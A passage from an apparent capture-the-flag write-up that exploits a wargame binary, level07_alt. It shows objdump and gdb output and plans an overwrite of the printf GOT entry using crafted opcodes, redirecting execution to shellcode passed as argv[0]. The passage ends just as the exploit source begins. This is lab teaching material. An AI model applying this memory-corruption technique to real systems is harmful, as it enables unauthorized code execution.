<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>objdump -D /levels/level07_alt
</span><span class='line'>... snip ...&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Disassembly of section .ctors:&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;080495ec &lt;__CTOR_LIST__&gt;:
</span><span class='line'> 80495ec:   ff                      <span class="o">(</span>bad<span class="o">)</span>&lt;br/&gt;
</span><span class='line'> 80495ed:   ff                      <span class="o">(</span>bad<span class="o">)</span>&lt;br/&gt;
</span><span class='line'> 80495ee:   ff                      <span class="o">(</span>bad<span class="o">)</span>&lt;br/&gt;
</span><span class='line'> 80495ef:   ff 00                   incl   <span class="o">(</span>%eax<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;080495f0 &lt;__CTOR_END__&gt;:
</span><span class='line'> 80495f0:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'>  ...&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Disassembly of section .dtors:&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;080495f4 &lt;__DTOR_LIST__&gt;:
</span><span class='line'> 80495f4:   ff                      <span class="o">(</span>bad<span class="o">)</span>&lt;br/&gt;
</span><span class='line'> 80495f5:   ff                      <span class="o">(</span>bad<span class="o">)</span>&lt;br/&gt;
</span><span class='line'> 80495f6:   ff                      <span class="o">(</span>bad<span class="o">)</span>&lt;br/&gt;
</span><span class='line'> 80495f7:   ff 00                   incl   <span class="o">(</span>%eax<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;080495f8 &lt;__DTOR_END__&gt;:
</span><span class='line'> 80495f8:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'>  ...&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Disassembly of section .jcr:&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;080495fc &lt;__JCR_END__&gt;:
</span><span class='line'> 80495fc:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'>  ...&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Disassembly of section .dynamic:&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;08049600 &lt;_DYNAMIC&gt;:
</span><span class='line'> 8049600:   01 00                   add    %eax,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049602:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049604:   10 00                   adc    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049606:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049608:   0c 00                   or     <span class="nv">$0x0</span>,%al
</span><span class='line'> 804960a:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 804960c:   78 82                   js     8049590 &amp;lt;&lt;strong&gt;FRAME_END&lt;/strong&gt;+0xfa8&gt;
</span><span class='line'> 804960e:   04 08                   add    <span class="nv">$0x8</span>,%al
</span><span class='line'> 8049610:   0d 00 00 00 9c          or     <span class="nv">$0x9c000000</span>,%eax
</span><span class='line'> 8049615:   85 04 08                <span class="nb">test</span>   %eax,<span class="o">(</span>%eax,%ecx,1<span class="o">)</span>
</span><span class='line'> 8049618:   04 00                   add    <span class="nv">$0x0</span>,%al
</span><span class='line'> 804961a:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 804961c:   48                      dec    %eax
</span><span class='line'> 804961d:   81 04 08 f5 fe ff 6f    addl   <span class="nv">$0x6ffffef5</span>,<span class="o">(</span>%eax,%ecx,1<span class="o">)</span>
</span><span class='line'> 8049624:   70 81                   jo     80495a7 &amp;lt;&lt;strong&gt;FRAME_END&lt;/strong&gt;+0xfbf&gt;
</span><span class='line'> 8049626:   04 08                   add    <span class="nv">$0x8</span>,%al
</span><span class='line'> 8049628:   05 00 00 00 e0          add    <span class="nv">$0xe0000000</span>,%eax
</span><span class='line'> 804962d:   81 04 08 06 00 00 00    addl   <span class="nv">$0x6</span>,<span class="o">(</span>%eax,%ecx,1<span class="o">)</span>
</span><span class='line'> 8049634:   90                      nop
</span><span class='line'> 8049635:   81 04 08 0a 00 00 00    addl   <span class="nv">$0xa</span>,<span class="o">(</span>%eax,%ecx,1<span class="o">)</span>
</span><span class='line'> 804963c:   4c                      dec    %esp
</span><span class='line'> 804963d:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 804963f:   00 0b                   add    %cl,<span class="o">(</span>%ebx<span class="o">)</span>
</span><span class='line'> 8049641:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049643:   00 10                   add    %dl,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049645:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049647:   00 15 00 00 00 00       add    %dl,0x0
</span><span class='line'> 804964d:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 804964f:   00 03                   add    %al,<span class="o">(</span>%ebx<span class="o">)</span>
</span><span class='line'> 8049651:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049653:   00 d4                   add    %dl,%ah
</span><span class='line'> 8049655:   96                      xchg   %eax,%esi
</span><span class='line'> 8049656:   04 08                   add    <span class="nv">$0x8</span>,%al
</span><span class='line'> 8049658:   02 00                   add    <span class="o">(</span>%eax<span class="o">)</span>,%al
</span><span class='line'> 804965a:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 804965c:   18 00                   sbb    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 804965e:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049660:   14 00                   adc    <span class="nv">$0x0</span>,%al
</span><span class='line'> 8049662:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049664:   11 00                   adc    %eax,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049666:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049668:   17                      pop    %ss
</span><span class='line'> 8049669:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 804966b:   00 60 82                add    %ah,-0x7e<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 804966e:   04 08                   add    <span class="nv">$0x8</span>,%al
</span><span class='line'> 8049670:   11 00                   adc    %eax,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049672:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049674:   58                      pop    %eax
</span><span class='line'> 8049675:   82                      <span class="o">(</span>bad<span class="o">)</span>&lt;br/&gt;
</span><span class='line'> 8049676:   04 08                   add    <span class="nv">$0x8</span>,%al
</span><span class='line'> 8049678:   12 00                   adc    <span class="o">(</span>%eax<span class="o">)</span>,%al
</span><span class='line'> 804967a:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 804967c:   08 00                   or     %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 804967e:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049680:   13 00                   adc    <span class="o">(</span>%eax<span class="o">)</span>,%eax
</span><span class='line'> 8049682:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049684:   08 00                   or     %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049686:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049688:   fe                      <span class="o">(</span>bad<span class="o">)</span>&lt;br/&gt;
</span><span class='line'> 8049689:   ff                      <span class="o">(</span>bad<span class="o">)</span>&lt;br/&gt;
</span><span class='line'> 804968a:   ff 6f 38                ljmp   &lt;em&gt;0x38<span class="o">(</span>%edi<span class="o">)</span>
</span><span class='line'> 804968d:   82                      <span class="o">(</span>bad<span class="o">)</span>&lt;br/&gt;
</span><span class='line'> 804968e:   04 08                   add    <span class="nv">$0x8</span>,%al
</span><span class='line'> 8049690:   ff                      <span class="o">(</span>bad<span class="o">)</span>&lt;br/&gt;
</span><span class='line'> 8049691:   ff                      <span class="o">(</span>bad<span class="o">)</span>&lt;br/&gt;
</span><span class='line'> 8049692:   ff 6f 01                ljmp   &lt;/em&gt;0x1<span class="o">(</span>%edi<span class="o">)</span>
</span><span class='line'> 8049695:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049697:   00 f0                   add    %dh,%al
</span><span class='line'> 8049699:   ff                      <span class="o">(</span>bad<span class="o">)</span>&lt;br/&gt;
</span><span class='line'> 804969a:   ff 6f 2c                ljmp   *0x2c<span class="o">(</span>%edi<span class="o">)</span>
</span><span class='line'> 804969d:   82                      <span class="o">(</span>bad<span class="o">)</span>&lt;br/&gt;
</span><span class='line'> 804969e:   04 08                   add    <span class="nv">$0x8</span>,%al
</span><span class='line'>  ...&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Disassembly of section .got:&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;080496d0 &amp;lt;.got&gt;:
</span><span class='line'> 80496d0:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'>  ...&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Disassembly of section .got.plt:&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;080496d4 &lt;_GLOBAL_OFFSET_TABLE_&gt;:
</span><span class='line'> 80496d4:   00 96 04 08 00 00       add    %dl,0x804<span class="o">(</span>%esi<span class="o">)</span>
</span><span class='line'> 80496da:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 80496dc:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 80496de:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 80496e0:   be 82 04 08 ce          mov    <span class="nv">$0xce080482</span>,%esi
</span><span class='line'> 80496e5:   82                      <span class="o">(</span>bad<span class="o">)</span>&lt;br/&gt;
</span><span class='line'> 80496e6:   04 08                   add    <span class="nv">$0x8</span>,%al
</span><span class='line'> 80496e8:   de                      .byte 0xde
</span><span class='line'> 80496e9:   82                      <span class="o">(</span>bad<span class="o">)</span>&lt;br/&gt;
</span><span class='line'> 80496ea:   04 08                   add    <span class="nv">$0x8</span>,%al&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Disassembly of section .data:&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;080496ec &lt;__data_start&gt;:
</span><span class='line'> 80496ec:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'>  ...&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;080496f0 &lt;__dso_handle&gt;:
</span><span class='line'> 80496f0:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'>  ...&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Disassembly of section .bss:&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;08049700 &amp;lt;completed.5706&gt;:
</span><span class='line'> 8049700:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'>  ...&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;08049704 &amp;lt;dtor_idx.5708&gt;:
</span><span class='line'>  ...&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;08049720 &lt;count&gt;:
</span><span class='line'>  ...
</span><span class='line'>... snip ...
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>As you can see, there area a few sections that we can write to:</p>

<ul>
<li>The <a href="http://gcc.gnu.org/onlinedocs/gccint/Initialization.html">.ctors</a> section is in range, but this isn't going to help us because the code executed in constructors is executed before our code gets to execute.</li>
<li>The <a href="http://gcc.gnu.org/onlinedocs/gccint/Initialization.html">.dtors</a> section is in range, hence we might be able to write something to this section which would get executed when the program exits.</li>
<li>The <a href="http://bottomupcs.sourceforge.net/csbu/x3824.htm" title="Global Offset Tables">GOT</a> is in range, so perhaps we can look into overwriting a <code>GOT</code> entry with something else that will help us compromise the application.</li>
</ul>


<p>Let's take a look at what's in the <code>GOT</code>:</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>objdump --dynamic-reloc /levels/level07_alt&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;/levels/level07_alt:     file format elf32-i386&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;DYNAMIC RELOCATION RECORDS
</span><span class='line'>OFFSET   TYPE              VALUE
</span><span class='line'>080496d0 R_386_GLOB_DAT    &lt;strong&gt;gmon_start&lt;/strong&gt;
</span><span class='line'>080496e0 R_386_JUMP_SLOT   &lt;strong&gt;gmon_start&lt;/strong&gt;
</span><span class='line'>080496e4 R_386_JUMP_SLOT   __libc_start_main
</span><span class='line'>080496e8 R_386_JUMP_SLOT   <span class="nb">printf</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>Here we can see 5 entries. The first three are all executed prior to the body of the program, hence they're not really options for attack. The last one, <code>printf</code>, looks promising because this doesn't get invoked until <em>after</em> all of the input characters have been passed in. We have the opportunity to rewrite this value to point somewhere else. If we fire this up in <code>gdb</code> and take a look at the value that's stored in this location just before the <code>printf</code> call we find that the value is <code>0x080482de</code>. Here's a (tidied) snapshot from <code>gdb</code>:</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb<span class="nv">$ </span>x/128x 0x8049520
</span><span class='line'>0x8049520           : 0x0cec8300      0xfffd4fe8      0x18bb8dff      0x8dffffff
</span><span class='line'>0x8049530           : 0xffff1883      0xc1c729ff      0xff8502ff      0xf6312474
</span><span class='line'>0x8049540           : 0x8910458b      0x8b082444      0x44890c45      0x458b0424
</span><span class='line'>0x8049550           : 0x24048908      0x18b394ff      0x83ffffff      0xfe3901c6
</span><span class='line'>0x8049560           : 0xc483de72      0x5f5e5b0c      0x1c8bc35d      0x9090c324
</span><span class='line'>0x8049570           : 0x53e58955      0xa104ec83      0x080495ec      0x74fff883
</span><span class='line'>0x8049580           : 0x95ecbb13      0x90660804      0xff04eb83      0x83038bd0
</span><span class='line'>0x8049590           : 0xf475fff8      0x5b04c483      0x9090c35d      0x53e58955
</span><span class='line'>0x80495a0           : 0xe804ec83      0x00000000      0x2cc3815b      0xe8000011
</span><span class='line'>0x80495b0           : 0xfffffd6c      0xc3c95b59      0x00000003      0x00020001
</span><span class='line'>0x80495c0           : 0x67617355      0x25203a65      0x6f772073      0x0a736472
</span><span class='line'>0x80495d0           : 0x00007300      0x66206325      0x646e756f      0x20692520
</span><span class='line'>0x80495e0           : 0x656d6974      0x000a7325      0x00000000      0xffffffff
</span><span class='line'>0x80495f0 &lt;CTE&gt;     : 0x00000000      0xffffffff      0x00000000      0x00000000
</span><span class='line'>0x8049600 &lt;DYN&gt;     : 0x00000001      0x00000010      0x0000000c      0x08048278
</span><span class='line'>0x8049610 &amp;lt;DYN+16&gt;  : 0x0000000d      0x0804859c      0x00000004      0x08048148
</span><span class='line'>0x8049620 &amp;lt;DYN+32&gt;  : 0x6ffffef5      0x08048170      0x00000005      0x080481e0
</span><span class='line'>0x8049630 &amp;lt;DYN+48&gt;  : 0x00000006      0x08048190      0x0000000a      0x0000004c
</span><span class='line'>0x8049640 &amp;lt;DYN+64&gt;  : 0x0000000b      0x00000010      0x00000015      0xb7fff8e0
</span><span class='line'>0x8049650 &amp;lt;DYN+80&gt;  : 0x00000003      0x080496d4      0x00000002      0x00000018
</span><span class='line'>0x8049660 &amp;lt;DYN+96&gt;  : 0x00000014      0x00000011      0x00000017      0x08048260
</span><span class='line'>0x8049670 &amp;lt;DYN+112&gt; : 0x00000011      0x08048258      0x00000012      0x00000008
</span><span class='line'>0x8049680 &amp;lt;DYN+128&gt; : 0x00000013      0x00000008      0x6ffffffe      0x08048238
</span><span class='line'>0x8049690 &amp;lt;DYN+144&gt; : 0x6fffffff      0x00000001      0x6ffffff0      0x0804822c
</span><span class='line'>0x80496a0 &amp;lt;DYN+160&gt; : 0x00000000      0x00000000      0x00000000      0x00000000
</span><span class='line'>0x80496b0 &amp;lt;DYN+176&gt; : 0x00000000      0x00000000      0x00000000      0x00000000
</span><span class='line'>0x80496c0 &amp;lt;DYN+192&gt; : 0x00000000      0x00000000      0x00000000      0x00000000
</span><span class='line'>0x80496d0           : 0x00000000      0x08049600      0xb7fff8f8      0xb7ff65f0
</span><span class='line'>0x80496e0 &amp;lt;GOT+12&gt;  : 0x080482be      0xb7ea9bc0      0x080482de      0x00000000  &lt;-- just here
</span><span class='line'>0x80496f0 &lt;DSO&gt;     : 0x00000000      0x00000000      0x00000000      0x00000000
</span><span class='line'>0x8049700           : 0x00000000      0x00000000      0x00000000      0x00000000
</span><span class='line'>0x8049710           : 0x00000000      0x00000000      0x00000000      0x00000000
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>Where:</p>

<ul>
<li><code>CTE</code> -> CTOR END</li>
<li><code>DYN</code> -> DYNAMIC</li>
<li><code>GOT</code> -> GLOBAL OFFSET TABLE</li>
<li><code>DSO</code> -> DSO HANDLE</li>
</ul>


<p>Remember that the application only allows us to increment existing values one at a time for every "index" (ie. character) that is passed on the command line. As a result, this value is what we have to add start with, and any address we want to point to has to come after this. Unfortunately for us, there is a limitation on the command line which prevents us from passing in any more than 128k characters. This is going to bite us in the butt later on.</p>

<p>We need to be able to point this address to an area of memory that we control. It'd be great if we could point this straight at <code>argv</code>, but we can't do that. Why? Because:</p>

<ol>
<li>The <code>count</code> array is an array of 32-bit integers. This means we can only increment whole <strong>word</strong> values, we can't increment individual <em>bytes</em>.</li>
<li>Areas of memory that we control, such as <code>argv[N]</code>, are in the high address ranges (think something like <code>o0xbffff___</code>). To increment a word value from the <code>printf</code> source value to a value like this, or even another value on the stack, we would need to increment that value too many times. We don't have the command-line character budget to be able to do that.</li>
</ol>


<p>This means that if we want to point the entry to something we control, we're going to have to point it to <code>count</code> +/- 128 words. This comes with its own set of issues:</p>

<ul>
<li>Within this range we would need to craft our own instructions that get executed, using nothing but incrementing values.</li>
<li>Realistically, we can only write to the lower 2 bytes of each 4-byte word. If we attempt to write higher we either blow our budget or waste too many characters on a single instruction.</li>
<li>The area of memory that we know we have control over that has predictable values prior to our code running is the intended storage area for the <code>count</code> array and at the start of the program that entire area is set to <code>zero</code>.</li>
<li>To my knowledge, there's no <code>GETROOT</code> instruction in x86 assembly, nor are there any instructions less than 3 bytes in size that can do something useful without other instructions working alongside them. This means writing multiple instructions to memory.</li>
<li>If we can only modify the lower 2 bytes, then the higher 2 bytes will remain <code>00 00</code>. Given that Intel x86 is little endian, this means that after our instructions those zero bytes will always be executed before our next instruction does.</li>
<li>The opcode <code>00 00</code> translates to <code>MOV [EAX], AL</code>, which means "take the value of the lower-order byte in <code>EAX</code> and store it in the location pointed to by <code>EAX</code>". This means we can't really use <code>EAX</code> for something useful because the code will attempt to write back to areas of memory that we are interested in, probably clobbering code or pointers that are important.</li>
</ul>


<p>Let's take a look at the state of <code>EAX</code> at the time the <code>printf</code> function is called:</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">(</span>gdb<span class="o">)</span> <span class="nb">break</span> *0x080484d3
</span><span class='line'>Breakpoint 1 at 0x80484d3
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> run abcd
</span><span class='line'>Starting program: /levels/level07_alt abcd&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Breakpoint 1, 0x080484d3 in main <span class="o">()</span>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> info registers
</span><span class='line'>eax            0x61 97
</span><span class='line'>ecx            0xbffffcb0   -1073742672
</span><span class='line'>edx            0x80485d1    134514129
</span><span class='line'>ebx            0xb7fd1ff4   -1208147980
</span><span class='line'>esp            0xbffffc60   0xbffffc60
</span><span class='line'>ebp            0xbffffc98   0xbffffc98
</span><span class='line'>esi            0x0  0
</span><span class='line'>edi            0x0  0
</span><span class='line'>eip            0x80484d3    0x80484d3 &amp;lt;main+303&gt;
</span><span class='line'>eflags         0x206    <span class="o">[</span> PF IF <span class="o">]</span>
</span><span class='line'>cs             0x23 35
</span><span class='line'>ss             0x2b 43
</span><span class='line'>ds             0x2b 43
</span><span class='line'>es             0x2b 43
</span><span class='line'>fs             0x0  0
</span><span class='line'>gs             0x63 99
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>What's interesting is that <code>EAX</code> contains the value <code>0x61</code>, which is ASCII for <code>a</code>. This happens to be the first character we pass in on the command line. As a result, we do have <em>some</em> control over <code>EAX</code> at this point, but not enough to allow us to point to a valid location. Unfortunately, if we are to allow the execution of <code>MOV [EAX], AL</code>, we can't let <code>EAX</code> contain a value like <code>0x00000061</code>, as writing to this area will cause an access violation. We're going to have to change this value to a valid pointer.</p>

<p>Also, take a look at <code>ECX</code>, as it's value looks to be in a memory area that we have control over. It turns out that <code>ECX</code> contains a pointer to <code>argc</code>, the number of arguments passed to the program on the command line. What's great about this, is that <code>argv</code> immediately follows it. That is, <code>argv</code> is located at <code>ECX+4</code>. Here we can see the start of a possible attack vector.</p>

<p>To get <code>ECX</code> to point to <code>argv[0]</code> and execute, we'd need to do the following (ASM with opcodes):</p>

<pre><code>INC ECX          41
INC ECX          41
INC ECX          41
INC ECX          41
MOV ECX, [ECX]   8B 09
JMP [ECX]        FF 21
</code></pre>

<p>This code increments <code>ECX</code> by <code>4</code>, then jumps to the address that is stored in the value <code>ECX</code> points to. This looks fine, but why can't we do this? Firstly, we can't have the instructions all close together like this. To write these values to the <code>count</code> array, we'd have to suffer the pain of having the double zero bytes in the way, like so:</p>

<pre><code>INC ECX          41
INC ECX          41
MOV [EAX], AL    00 00
INC ECX          41
INC ECX          41
MOV [EAX], AL    00 00
MOV ECX, [ECX]   8B 09
MOV [EAX], AL    00 00
JMP [ECX]        FF 21
</code></pre>

<p>This is made worse by the fact that <code>EAX</code> contains a crap address. Given that we don't really care about the content of <code>ECX</code> which is just a counter of arguments passed to the program, we can overwrite <code>EAX</code> with <code>ECX</code> resulting in a valid pointer that references an address we don't really care about. Each time the double-null instruction is executed, a 1-byte value will be written over the top of <code>argc</code>. No more crash!</p>

<pre><code>MOV EAX, ECX     89 C8
MOV [EAX], AL    00 00
INC ECX          41
INC ECX          41
MOV [EAX], AL    00 00
INC ECX          41
INC ECX          41
MOV [EAX], AL    00 00
MOV ECX, [ECX]   8B 09
MOV [EAX], AL    00 00
JMP [ECX]        FF 21
</code></pre>

<p>Therefore somewhere in <code>count</code> we need to write these values so that the memory looks like this (little-endian remember!):</p>

<pre><code>0x0000C889 0x00004141 0x00004141 0x0000098B 0x000021FF
</code></pre>

<p>Wherever we write this value, we need to know the location so that we can increment the <code>printf</code> <code>GOT</code> entry so that it points to the start of this code. Great, we're well underway then, right?</p>

<p>Wrong, there is still one more issue. If this code runs successfully, then <code>EIP</code> should point directly at <code>argv[0]</code>; that is, it'll point at the string which contains the name of the program that was executed, <code>/levels/level07_alt</code>. This isn't exactly usable shellcode that is going to give us what we need. However, there is a way around this. In C, we can use the <code>execl()</code> function to invoke another binary, and specify <em>all</em> of the arguments <em>including</em> <code>argv[0]</code>. As a result, we can write some shellcode and use this for <code>argv[0]</code> instead of the program name.</p>

<p>So with all this in mind, below is the full source to the exploit (rather verbose, but it's on purpose) in C:</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Exploit Source  </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
